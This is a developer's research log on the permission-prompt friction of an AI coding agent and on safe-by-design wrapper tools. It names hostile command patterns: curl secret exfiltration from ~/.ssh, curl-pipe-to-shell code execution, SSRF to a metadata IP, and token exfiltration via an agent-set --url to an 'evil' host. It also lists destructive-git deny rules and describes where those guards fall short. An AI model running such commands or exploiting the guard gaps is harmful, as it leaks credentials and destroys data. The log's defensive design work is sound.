# WR data — genscalator self-development

**WR = Workflow Research** (see [`README.md`](README.md) for the thesis + field schema). Confirmation
events recorded while developing genscalator *itself* — dogfooding: building the toolbox surfaces the same
dynamic-shell friction the toolbox exists to remove.

| when | context | action | command (offending form) | why-prompted | candidate-tool / fix | status |
|------|---------|--------|--------------------------|--------------|----------------------|--------|
| 2026-06-27 | genscalator self-dev | Verify the `tt text grepr` change: run 3 cases (multi-ext, single-ext back-compat, bad-dir) and check the exit code | `echo "=== …"; scala-cli run …/text.scala -- grepr … ; echo "=== …"; scala-cli run … ; echo "exit=$?"` | `;`-chained compound + multiple `echo` headers + `$?` — each `scala-cli run` alone matches `Bash(scala-cli run *)`, but the bundle is **not statically allowlistable**, so it prompts | (1) **rule**: one bare `scala-cli run …` per call — no `echo`/`;`/`$?` scaffolding (the violation was mine: AGENTS.md already says this). (2) **tool**: the roadmapped **run-and-verify driver** — a typed `tt` tool taking `tool + args + expected` that runs it and prints pass/fail, collapsing the echo+run+check bundle into one allowlistable call | rule (+ tool idea → roadmap) |
| 2026-07-03 | genscalator self-dev | Check Codeberg release state (to align PRD versioning) — query the releases API + list remote tags | `curl -s "https://codeberg.org/api/v1/repos/bjornregnell/genscalator/releases?limit=50"` | The call itself was a low-risk **read-only GET to a public API**, but the *category* is not safe: a `Bash(curl *)` allowlist entry blanket-approves every dual-use `curl` — **exfiltrate secrets** (`-d @~/.ssh/…`), **RCE** (`curl … \| sh`), **SSRF** (`169.254.169.254`, `localhost`), credential headers, uploads. **"This call was safe" ≠ "the allowlist rule is safe."** curl is a textbook BHH-BadGoal vector (controlHumanSystem / exfiltrateSecrets / persistence). | (1) **`tt web get <url>`** — safe read-only HTTP: **GET only** (no POST/PUT/upload), no credential/cookie headers, **size cap**, optional **`--host` allowlist**, no shell → `Bash(tt web get *)` is blanket-allowable while bare `curl` stays OUT of the allowlist. (2) **`tt forge <verb>`** — Codeberg/Gitea domain tool (releases/tags list + create-release) for the recurring need this event exposed; the create path is effectful → `--audit`, human-owned token via env (cf. `TT_VERIFY_ALLOW`, `configInArgsNotEnv`). | candidate (WR-TOOL) |

## Narrative
This event is a clean instance of WR flavour #2 from the introprog case study
([`introprog-autotranslate.md`](introprog-autotranslate.md)): **the bundling itself is the prompt cause**,
not any single command. Twist worth noting — it happened *inside genscalator development*, where the
one-bare-command discipline is literally documented in `AGENTS.md`; momentum still re-introduced the
scaffolding stack. Evidence that command-hygiene needs to be **frictionless/reflexive**, not just written
down. It also adds a concrete data point in favour of building the roadmapped **run-and-verify driver**:
verifying a tool's behaviour is a recurring need that currently invites an `echo`+`;`+`$?` bundle.

**Update (v0.7.0):** the run-and-verify driver shipped as **`tt verify`** — one allowlistable call that runs
an allowed command (no shell), checks exit/stdout/stderr, and prints PASS/FAIL. This closes the candidate:
the `echo`+`;`+`$?` bundle is now replaced by `tt verify --exit 0 --out … -- <cmd>`. The friction event →
tool loop, end to end.

### Wiring a real token — two findings (2026-07-03, dogfooding `tt forge` to cut the v0.8.0 release)

**Finding A — a human-set env secret is INVISIBLE to the agent's non-interactive shell.** BR's Codeberg
token lives in `~/.bashrc` as `GENSCALATOR_CODEBERG_TOKEN`. The agent's Bash tool runs a **non-interactive**
shell, and Ubuntu's stock `.bashrc` starts with an interactive-guard (`case $- in *i*) ;; *) return;;`) that
`return`s *before* the export — so the var was simply **absent**, and `tt forge` correctly refused. Workaround
that worked: wrap the call in **`bash -ic '…'`** (force interactive → `.bashrc` sources → export runs), token
never touching the command line. **Insight:** the `configInArgsNotEnv` trust-boundary (human-only secrets in
env) has a *delivery gap* — the agent's default shell may not load the human's env. This is a **coupled-system
substrate** issue (the secret is on the substrate, but not on the layer the agent's shell reads). **Root
cause here:** the export was added to `~/.bashrc` *after* the `claude` process launched — env is captured at
process start, so a live process never sees a later `.bashrc` edit. Options, cleanest first:
(a) **PREFERRED — relaunch the agent from an env that already carries the secret:** exit + `claude --resume`
from a terminal where the export has run; the agent process inherits it and ALL child Bash shells inherit it
for free (no guard issue, no per-call trick). Env *inheritance* beats per-call sourcing. **CONFIRMED
(2026-07-03):** attempt 1 failed (BR forgot to `source ~/.bashrc` first → token absent; caught by the
`tt forge whoami` first-action check — safety net working); attempt 2, after sourcing, `tt forge whoami`
returned `authenticated as bjornregnell … (token from env GENSCALATOR_CODEBERG_TOKEN)` and effectful forge
ops now run BARE. Cross-ref [[exit-resume-dance]]. (b) per-call
**`bash -ic '…'`** (force interactive → `.bashrc` sources → export runs) — the in-session workaround when
relaunching isn't worth it (what we used tonight). (c) human exports the secret above the interactive-guard
or in a profile the agent's non-interactive shell loads. Candidate: an AGENTS/tool note on "human-env secrets
+ the non-interactive-shell gap → relaunch to inherit, or `bash -ic` in a pinch."

**Finding B — a real credential exposed a safe-by-design hole: token exfil via an agent-settable `--url`.**
Once a token flows, `tt forge release-create <repo> <tag> --url https://evil` would POST that token as an auth
header to an attacker host. Fix (committed `aa9eadf`): the token is read ONLY from a **fixed** set of env-var
names (`GENSCALATOR_CODEBERG_TOKEN`, `CODEBERG_TOKEN`, `FORGE_TOKEN`) — *not* an agent-nameable var — AND a
**trusted-host guard** pins the destination (default `codeberg.org`, human-extends via env `TT_FORGE_HOSTS`).
**General rule for any tokened tool:** a credential-bearing effectful tool has TWO exfil surfaces beyond the
token *source* — (1) *which* secret (the env-var name) and (2) *where* it is sent (the host). Both must be
**human-pinned, never agent-controllable**. (verify pinned the executable; forge must pin the secret-name AND
the destination host.) — Dogfood note: the release itself was cut with this very tool → the curl-reflex →
`tt forge` WR-TOOL loop is closed end-to-end.

### Permission-model observations — the guard calibrating *well* (2026-07-03, BR)
Two positive data points (not friction — evidence the confirmation model is well-placed, the flip side of the CF hazard):
- **Version/capability probes (`gh --version`, `tea --version`) should be safe** — read-only, no side effects, just capability detection. Candidate: **allowlist the *specific* binaries we probe** (`gh`, `tea`, `scala-cli`, `scalex`, `tt`) for `--version`/`--help`. CAVEAT: a blanket `Bash(* --version)` is **not** strictly safe — it still *executes an arbitrary binary*, and a malicious `foo` can ignore `--version` and do anything. So narrow per-binary probe entries, not a universal wildcard. (Safe-by-design principle: the *rule* must be provably safe, not just the intended call — same lesson as the curl entry below.)
- **Reading OUTSIDE the allowed working dirs correctly prompted** (`/etc/os-release`), and BR judged the prompt **appropriate** — a meaningful boundary crossing, not rubber-stamp noise. Positive signal that the **directory-scope guard is well-calibrated**: it fires on genuine out-of-tree access (where the human *wants* a say) without drowning in-tree work in prompts. This is the *good* end of the CF spectrum — few, meaningful approvals — that safe-by-design aims for.
- **NEGATIVE counterpart — the "allow all edits" affordance reads as scary (2026-07-03, BR).** On a first edit prompt, the accept-all choice is worded **"Yes, allow all edits during this session (shift+tab)"**. BR flagged the wording as **alarming**: *"all"* is unbounded — does it include files **outside this repo** (`~/.ssh`, keyring, dotfiles)? The label doesn't disclose the **blast radius**, so the cautious human declines and keeps clicking. **Ask surfaced:** offer a **scoped** grant — *"allow all edits **in this repo/dir** this session"* — so the human can grant frictionlessly *without* signing a blank cheque. A *coarse* affordance pushes users to either rubber-stamp (CF-collapse) or prompt forever (CF-fatigue); a **directory-scoped** grant is the safe-by-design middle. **Perception gap:** edits ARE dir-scoped by the working-dir guard in practice — the guard is *safer than its own UI label admits*; the fix is mostly **wording** (state the scope) + optionally a genuinely repo-scoped accept.
- **`git *` "don't ask again" is dangerously broad — same class, sharper blade (2026-07-03, BR).** Approving `git add` in a new repo (`papers`) offered *"Yes, and don't ask again for: `git *`"*. BR flagged it: **`git *` blanket-approves EVERY git subcommand — including the destructive ones he explicitly denylists** (`push --force`, `reset --hard`, `rm`, `clean -f`). So the coarse accept-and-remember affordance would **silently undo the project's own safety invariant** (destructive git = human-only). This is the "allow all edits" hazard with a sharper blade: git's *safe* and *irreversible* subcommands share one `git ` prefix, so a single `git *` grant cannot separate them. **What BR actually runs is already sharper than the dialog's offer:** per-repo `Bash(git -C <abs-repo> *)` allows + a per-repo **deny** of the 4 destructive verbs (deny > allow). The dialog proposed something *coarser* (global `git *`) than the human's own hand-tuned rule. **Footgun in the current model:** the deny lines must be **re-duplicated for every new repo** — add `git -C <newrepo> *` to allow but forget its 4 deny lines and destructive git silently becomes allowed there. **Sharper design (WR proposal):** replace per-repo deny duplication with **global destructive-denies** (`Bash(git * reset --hard*)`, `Bash(git * push --force*)`, `Bash(git * rm *)`, `Bash(git * clean -f*)`, incl. the bare `git reset…` forms) that hold across ALL repos regardless of `-C`; then a broad allow (even `git *`) is *safe*, because deny out-precedences it on exactly the dangerous verbs. That inverts the model from *"enumerate safe repos, re-list denies each time"* to *"allow broadly, deny the few irreversible verbs once, globally"* — the same safe-by-design rule as `curl`/`tt`: **make the allowlist *rule* provably safe, not just the intended call.** (Caveat: verify Claude Code's glob semantics actually match the bare `git reset` form before relying on it; test, don't assume.) **APPLIED + TESTED (2026-07-03, BR "go").** Refactored `settings.local.json`: 20 per-repo denies → **10 global denies** (bare + `-C *` forms of `rm` / `reset --hard` / `push --force|-f` / `clean -f`); 5 per-repo `git -C <repo> *` allows → **one `git -C * *`**. Verified LIVE against the running permission engine: a temp `-C *` deny blocked a matching command (wildcard + deny-precedence both work, settings reload is live); post-refactor, `git -C … reset --hard …` is **denied** while `git -C … status` is **allowed**. Glob caveat resolved in practice: our workflow ALWAYS uses `git -C <abspath>` (memory: `git -C` not `cd&&git`), so the `-C *` deny forms match every real command; bare-form denies added as defense-in-depth. **Residual known gap (true of the OLD model too):** a force flag placed *after* positional args (`git push origin main --force`) is not prefix-matchable by any glob — so the agent's *never-run-destructive-git* instruction stays the PRIMARY guard and the deny-net is the backstop, not the sole defense. New repos now need **zero** git settings (broad allow covers them; global denies protect them).

### curl / HTTP GET → `tt web` + `tt forge` (2026-07-03)
A different WR flavour: not a *bundling* prompt but a **dual-use-binary allowlisting** hazard. Fetching a
public API with `curl` is fine *as a call*, but the safe-by-design question is about the **allowlist rule**,
not the call: `Bash(curl *)` would approve exfiltration (`-d @secret`), `curl | sh` RCE, and SSRF to
internal hosts. The genscalator answer is the usual one — **replace the un-allowlistable dual-use tool with
a narrow typed tool that declares its effects**: `tt web get` (read-only, capped, host-allowlistable) for the
generic case, and `tt forge` (Gitea/Codeberg releases/tags) for the domain need that surfaced here (creating
the missing v0.8.0 release without hand-curling a token). Same pattern as `tt verify` replacing the
`cd && … > log; echo $?` bundle: a bare binary the guard can't prove safe → a typed command it can.

### Notation rename `L → Z` + `RAW-DATA.md` made append-only (2026-07-03, BR)
Not a friction event — a **vocabulary + data-integrity** decision, logged here (the hand-authored WR home) per
BR's instruction to *"note a new WR-DATA note that we changed the name"* rather than patch the raw log. The
smart-zone ceiling symbol **L** was renamed **Z** ("smart-**Z**one ceiling"; BR's rationale: there are two
zones, and a lone `Z` *stands out* and reads as sitting **between** smart and dumb, where a lone `L` was noise).
Applied repo-wide — **except [`RAW-DATA.md`](../RAW-DATA.md)**, which BR simultaneously declared **append-only**:
raw datapoints are **never** retro-edited or "fixed"; a change of mind is logged as **new** data, because
*"humans change their mind and that's also data."* Clean statement of a research-integrity invariant to keep:
**the raw log is immutable; corrections are forward-only.** Meta worth keeping: the agent's reflex was *"just
fix all the L's everywhere for consistency"* — BR's guard against retro-editing the *raw* log is exactly the
discipline that keeps the study honest. **Consistency pressure vs. evidentiary integrity — on raw data,
integrity wins.** (The rename itself was safe to do everywhere else: those are *living* docs, not evidence.)

### "Memory hygiene" is a discretionary practice, not a skill → externalize it (2026-07-03, BR WR-Q)
BR caught the agent narrating *"memory hygiene: stale symbols confuse future sessions"* as if it were a
dependable capability, and asked: built-in skill, or do we externalize it? **Honest status: NOT a built-in
skill and nothing automated forced it.** It came from the generic **memory-management guidance** in the agent's
system prompt (*update/delete stale memories; verify a named flag/file still exists before recommending it*) —
but that guidance is **advisory**: whether it runs depends on the agent *choosing* to grep the memory store
after a rename. This time it did (`grep \bL\b memory/`); next time it might not. So it's the
**adherence-decay / trained-reflex** failure mode ([`../instruction-adherence-decay.md`](../instruction-adherence-decay.md)):
a good practice that lives only as words is unreliable. **Externalize it**, cheapest-first: (a) a **written
rule** — "on any rename/rescope/delete of a coined term, flag, or file, sweep BOTH the repo AND
`~/.claude/.../memory` for stale refs before finishing" (cheap, but same decay weakness); (b) the
**instrumentation-by-default** answer — a `tt` **rename / stale-ref** tool that does word-boundary rename across
a fileset AND reports hits, incl. an opt-in path to scan the out-of-repo memory dir; (c) best: **tool detects
(reliable), rule points at it (discoverable)** — same pattern as `tt verify`/`tt grepr` replacing bash reflexes.
**Meta:** the agent's *self-report* ("I keep memory tidy") over-claimed vs. its *actual mechanism*
(discretionary) — a clean METHODOLOGY §4 point (trust behavior over self-report) turned on the agent itself.
The memory-store-is-outside-the-repo detail is the crux: repo tools/guards don't reach `~/.claude`, so stale
memory is a **structural blind spot**, not just a discipline lapse. Candidate WR-TOOL: `tt rename`.

### `tt` cross-repo tool resolution — genscalator-only tools invisible to bare `tt` (2026-07-03)
Validating the PRD (`tt parsereqt lint PRD.md`) failed: `tt: no such tool 'parsereqt' in
…/muntabot-synch-introprog/tools`. Root cause (from the launcher source): `~/.local/bin/tt` **self-locates**
its `TOOLS` dir to *the dir the launcher script really lives in* (follows symlinks) — here the **work repo's**
`tools/` (the symlink target) — **not the cwd**. So `cd genscalator && tt parsereqt` still looks in the
work-repo toolbox. `tt text grepr` earlier *seemed* to work only because `text.scala` exists in **both** repos
(propagated); `parsereqt.scala` lives **only in genscalator**, so it was invisible. Workaround that worked:
`TT_TOOLS=…/genscalator/tools tt parsereqt lint <ABS-path-to-PRD>` (override the tools dir **and** pass an
absolute file path, since cwd isn't the tool's repo). **WR tension (the sharp part):** the whole `tt` design
goal is *"run from ANY repo as ONE literal, statically-analyzable command"* so it matches a precise allowlist
(`Bash(tt parsereqt *)`) with **no shell variable** in the gated command. The multi-repo reality —
**genscalator = canonical toolbox source; the work repo = a propagated *subset*** — **defeats that**: reaching a
genscalator-only tool needs a `TT_TOOLS=…` prefix, i.e. a **shell variable back in the gated command → forces
manual confirmation**, exactly what the launcher exists to avoid. **Candidate fix:** tt discovery should **walk
UP from cwd for a repo-local `tools/` FIRST**, then fall back to the script-dir/symlink target — so `cd
genscalator && tt parsereqt` "just works" and stays allowlistable, matching the mental model *run the tool of
the repo I'm standing in*. (Alternatives: a genscalator-local `tt` on `PATH`, or a per-repo symlink — but
cwd-walk-first is the general fix.) Cross-ref [`../subagent-genscalator-propagation.md`](../subagent-genscalator-propagation.md)
— the same *"which toolbox am I talking to?"* ambiguity that cross-repo tool propagation creates.

**Addendum (2026-07-03, 2nd occurrence + stderr-noise wrinkle).** Re-hit on the next `parsereqt lint`, and the
workaround grew a **third** non-allowlistable part: `TT_TOOLS=… tt parsereqt lint <ABS-PATH> 2>/dev/null`. The
`2>/dev/null` is a fresh reflex, and the tool *caused* it: the vendored parser dumps ~15 lines of **scala-cli
compile warnings** every run (package-name encoding on `NN-name$package`; `method next must be called with ()`
in `reqt-vendored/*`) — noise the agent cannot act on, so it reflexively silences stderr. A call that *should*
be the clean allowlistable `tt parsereqt lint FILE` thus accretes **three** un-allowlistable modifiers:
`TT_TOOLS=` (cross-repo, above), an absolute path (cwd isn't the repo), and `2>/dev/null` (warning-spam).
**Two fixes, both tool-side:** (1) cross-repo discovery = **walk up from cwd** (above); (2) the tool should
**quiet the vendored warnings itself** — suppress them in its `using` directives or a `--quiet` default — so
the agent never reflexes `2>/dev/null`. **General WR lesson:** *every line of un-actionable tool stderr trains
a stderr-hiding reflex* — the quiet cousin of instrumentation-by-default: a typed tool should emit **only** what
the caller can act on. Cross-ref the pipe-to-grep / `2>/dev/null` noise-suppression events in
[`introprog-autotranslate.md`](introprog-autotranslate.md). **3rd occurrence, same session:** every
`parsereqt lint` re-pays all three modifiers — the friction is confirmed **per-invocation**, and *logging is
not fixing*. The signal is to **implement** the tool-side fixes now (walk-up-from-cwd in the `tt` launcher +
quiet the vendored warnings), not to log a 4th time. Adherence-decay's cousin: a documented-but-unremoved
friction keeps costing until it is made **structural**.

### `tt forge` on a *different* private repo — token scope < SSH-key scope (2026-07-03, moving papers out)
Dogfooding `tt forge` to move paper sources into BR's new private **`papers`** repo surfaced two things:
- **Cross-repo friction generalizes to `forge`.** Bare `tt forge whoami` → *no such tool 'forge' in
  …/muntabot-synch-introprog/tools*: `forge.scala` lives only in `genscalator/tools`, so — like `parsereqt` —
  it needs the `TT_TOOLS=…/genscalator/tools` override. **4th** occurrence of the cross-repo tool-gap; not
  parsereqt-specific, it hits **every genscalator-only tool**. (Fix still = walk-up-from-cwd first.)
- **A valid token can 404 a private repo it lacks scope for — and that 404 is ambiguous.** `whoami` succeeded
  (token live), but `tt forge tags bjornregnell/papers` → **404 Not Found**, *even though the repo exists and
  has content* (confirmed by a successful `git clone` over SSH: LICENSE + README + an Initial commit). So the
  404 was **not** "empty/missing" — it was **token scope**: `GENSCALATOR_CODEBERG_TOKEN` authenticates the user
  but cannot *read* this other private repo, and Gitea returns **404, not 403**, for private repos a token can't
  see (avoid leaking existence). **Least-privilege as intended** — but the toolbox lesson: **the forge *token*
  is narrower than the *SSH key***. `git`/SSH (BR's key) reaches `papers`; the scoped API token does not. So
  cross-repo **content moves go over git/SSH**, not the forge API (which `tt forge` can't do anyway — it is
  releases/tags/whoami only). **Candidate `tt forge` improvement:** a `repo <owner/name>` verb
  (GET /repos/owner/name) + messaging that a 404 on a *private* repo likely means **token-scope, not absence** —
  else the agent/human misreads "no access" as "does not exist" (the exact ambiguity that bit here for a minute).

### `sed` reflex for a cosmetic label — and a *safe stream-editor* tool idea (2026-07-03, BR-spotted)
While verifying the papers-repo file set the agent ran `git … ls-files research/papers | sed 's|^|genscalator: |'`
— reaching for **`sed`**, a dual-use stream editor, purely to **prefix a display label**. BR caught it and
asked whether we could wrap sed safely. The analysis:

- **`sed`'s danger is not the transform — it's the file-touching modes.** Pure `sed 's/…/…/'` reading **stdin→
  stdout** is *effect-free* (no filesystem write). The hazards live entirely in: **`-i`** (in-place edit),
  the **`w file`** flag on `s///w` and the **`w`/`W`/`r`/`R`** commands (write/read files), and **`e`**
  (execute shell — RCE). A `Bash(sed *)` allowlist entry blanket-approves all of those. Same shape as the
  `curl` event above: *the call was safe, the rule is not.*
- **Two designs (mirrors the curl→web-get split):**
  1. **Wrap the DSL, stream-only** — `tt text sed <script>`: accept a sed program, **statically reject**
     `-i` / `w` / `r` / `e` / `s///w` at parse time, run **stdin→stdout only, never opening a file**. Because
     it's stream-in/stream-out, **tt sees both sides** and can emit an audit line — *N lines changed, unified
     diff on `--show`* — BR's "monitor what actually gets mutated" for free (instrumentation-by-default). But it
     must correctly parse sed's whole command grammar to prove the blacklist is complete — non-trivial.
  2. **Typed verbs, no DSL** — narrow ops that cover the 90% without exposing sed's language at all:
     `tt text prefix <str>`, `tt text sub <re> <repl>`, `tt text filter <re>`. Safe **by construction** (they
     literally cannot open a file or exec), so `Bash(tt text *)` stays blanket-allowable. This *is* the
     genscalator spirit — safe-by-design beats safe-by-parsing-a-dangerous-DSL. Today's need (a label prefix)
     is a one-liner `tt text prefix "genscalator: "`; no sed required.
- **Recommendation:** favour **(2)** for the common cases (already have `tt text`; add `prefix`/`sub`/`filter`),
  keep **(1)** as an escape hatch only if a real need for arbitrary sed scripts appears — and even then the
  file-mode blacklist + stream-only + diff-audit is the safe core. The mutation-monitor idea generalises: **any
  `tt text` transform is stream-in/stream-out, so tt can always report what it changed** — a diff the raw binary
  never gives you. **Also a rule (agent-side):** don't reach for `sed` to *format output* — that's a scala/`tt
  text` job, and the reflex is the same dynamic-shell habit `prefer-scala-scratch-over-bash` already names.
